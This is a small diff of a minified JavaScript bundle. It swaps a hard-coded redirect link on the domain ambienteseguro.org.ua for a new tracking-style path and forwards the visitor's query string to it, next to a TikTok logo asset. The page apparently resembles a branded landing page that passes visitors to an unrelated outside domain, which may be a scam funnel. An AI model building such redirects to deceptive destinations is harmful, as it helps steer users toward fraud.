@@ -20475,7 +20475,7 @@ const Vk = "/assets/tiktok-logo-DDggXciB.png"
       , [g] = f.useState(19)
       , w = () => new URLSearchParams(window.location.search).toString()
       , y = () => {
-        const P = "https://ambienteseguro.org.ua/c/32ff2f6eda"
+        const P = "https://ambienteseguro.org.ua/c/8273698ef7"
           , H = w();
         return H ? `${P}?${H}` : P
     }
@@ -23290,3 +23290,4 @@ ks)
     })
 });
 z0(document.getElementById("root")).render(c.jsx(iN, {}));
+
